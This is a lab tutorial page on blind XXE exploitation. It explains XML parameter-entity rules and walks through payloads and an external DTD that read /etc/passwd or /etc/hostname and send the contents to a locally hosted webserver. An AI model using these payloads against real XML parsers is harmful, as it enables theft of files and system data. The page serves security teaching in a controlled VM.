---
title: "Blind XXE Exploit"
weight: 6
---

Lets try setting up two general entities. The first will read the `/etc/password` file and the second will send the contents to our webserver. To do this we define a `foo` entity with the contents of the local file and then use the `http` request and place the `foo` entity in the URL that is requested.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE doc [
  <!ENTITY foo SYSTEM "file:///etc/passwd">
  <!ENTITY xxe SYSTEM "http://127.0.0.1:5000/&foo;">
]>

<todo>&xxe;</todo>
```

We get an error and on our webserver we see the request, but the general entity `foo` is not interpolated. Why?

{{% notice info %}}
This breaks rule 3 of the General Entity rules - A General Entity may be part of another entity definition but only if that entity will be used directly in the document. Because the `&foo;` is not used directly in the document but rather as part of the URL for an external entity it won't work.
{{% /notice %}}

The good news is that we can use [Parameter Entities]({{< ref "entities.md#parameter-entities" >}}). But there are some limitations to their use:

According to [w3](https://www.w3.org/TR/xml/#wfc-PEinInternalSubset)

> The use of parameter entities in the internal subset is restricted as described below.
...
> In the internal DTD subset, parameter-entity references MUST NOT occur within markup declarations; they may occur where markup declarations can occur. (This does not apply to references that occur in external parameter entities or to the external subset.)

Breaking this down there are two important parts:

1. Paramater entities cannot be declared or used within a definition of an entity
2. **Except if the entity is an external defined entity**

The second line is very important as that is how we will exfil data. But first, lets make sure we understand the first line.

Using the xml below: The usage of the `passwd` parameter entity at the end of line 3 will fail because it is used within the declaration of the `wrapper` parameter entity. On the other hand the `%wrapper;` on line 4 is perfectly fine because it is not used within a declaration.

```xml
<!DOCTYPE xxe [
  <!ENTITY % passwd SYSTEM "/etc/passwd">
  <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://127.0.0.1:5000/?%passwd;'>">
  %wrapper;
]>
```

## External Entities

In our VM you will find the `/home/vagrant/dtds/external.dtd` file with the following content:

```bash
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

Now run the python webserver from the `/home/vagrant/dtds` directory

```bash
cd /home/vagrant/dtds
python3 -m http.server 5000
```

Now submit the following in the app

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/external.dtd"> %xxe;
]>
```

![Blind XXE Illegal Character URL](/static/img/blind_xxe_illegal_character_url.png)

The error we get back states that there were illegal characters in the URL. This is most likely caused by the carriage returns in the file. Lets try a file that should not contain anything that will cause URL issues and see if we are successful.

We are going to change the file we are trying to retrieve to `/etc/hostname`. To do that we will use the `hostname.dtd` found in the `/home/vagrant/dtds` directory.

```bash
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:5000/?x=%file;'>">
%eval;
%exfil;
```

Now submit the following xml which calls the hostname file.

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://127.0.0.1:5000/hostname.dtd"> %xxe;
]>
```

We see that the error page no longer states that there is a URL error.

![Blind XXE Hostname Error](/static/img/blind_xxe_hostname_error.png)

If we check the python server we see a new request that includes the VM hostname:

![Python Webserver Hostname](/static/img/python_webserver_hostname.png)
